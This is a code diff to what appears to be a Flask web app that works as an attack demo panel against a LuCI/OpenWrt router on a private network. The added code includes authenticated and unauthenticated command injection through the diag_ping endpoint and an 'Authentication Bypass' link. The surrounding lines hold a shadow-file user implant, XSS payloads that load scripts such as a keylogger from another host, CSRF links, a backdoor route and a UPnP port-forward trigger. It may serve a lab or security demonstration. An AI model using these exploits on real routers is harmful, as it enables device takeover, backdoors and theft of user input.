@@ -16,6 +16,7 @@ shadow_implant='echo ruser:\'$\'1\'$\'4Q5Z0BuW\'$\'9UI5yWhHR3.NWxjuDR2Cs`echo $P
 xss_alert_script='alert(1)'
 xss_alert_injection='script src=//172&#46;30&#46;254&#46;2/s>'
 xss_keylogger_injection='<script src=//172&#46;30&#46;254&#46;2/t>'
+wan_ip='10.254.254.1'
 
 @app.route('/')
 def root():
@@ -25,10 +26,13 @@ def root():
     check("bs4")+\
     '-->'+\
     '<br><a href=/call/'+quote(start_ivwrt_cmd)+'>Start Iv-Wrt</a></>\
+    <br><a href=http://'+ip+'/>LAN side</a></>\
+    <br><a href=http://'+wan_ip+'/>WAN Side</a></>\
     <br><a href=/call/'+quote(upnpc_forward)+'>Poke a hole via upnp</a></>\
     <br>'+\
     mk_csrf_link('80', 'Clck to get CSRF\'d')+\
     '</>\
+    <br><a href=http://'+ip+'/cgi-bin/luci/admin/network/diagnostics/>Authentication Bypass</a></>\
     <br><a href=/implant_backdoor>Implant a Backdoor</a></>\
     <br><a href=/reflected_xss>Reflected XSS attack (doesn\'t work in chrome)</a></>\
     <br><a href=/cmd_inject/ls>Command Injection: ls</a></>\
@@ -46,6 +50,21 @@ def no_opts_call(command):
 @app.route('/call/<command>/<flags>/')
 def opts_call(command, flags):
     return call_command(command, flags)
+
+def auth_get(url):
+    payload = {
+        'luci_username': uname,
+        'luci_password': pword,
+        }
+    session = requests.session()
+    r = session.post(url, data = payload)
+    return r.text
+
+def get(url):
+    session = requests.session()
+    r = session.get(url)
+    return r.text
+
 #
 #Command injection stuff
 #
@@ -54,13 +73,12 @@ pword = 'admin'
 ip = '172.30.254.1'
 @app.route('/cmd_inject/<command>')
 def cmd_inject(command):
-    payload = {
-        'luci_username': uname,
-        'luci_password': pword,
-        }
-    session = requests.session()
-    r = session.post('http://'+ip+'/cgi-bin/luci/admin/network/diag_ping/;'+command, data = payload)
-    return r.text
+    return auth_get('http://'+ip+'/cgi-bin/luci/admin/network/diag_ping/;'+command)
+    
+
+@app.route('/unauth_cmd_inject/<command>/')
+def unauth_cmd_inject(command):
+    return get('http://'+ip+'/cgi-bin/luci/admin/network/diag_ping/;'+command)
 
 @app.route('/implant_backdoor')
 def implant_backdoor():
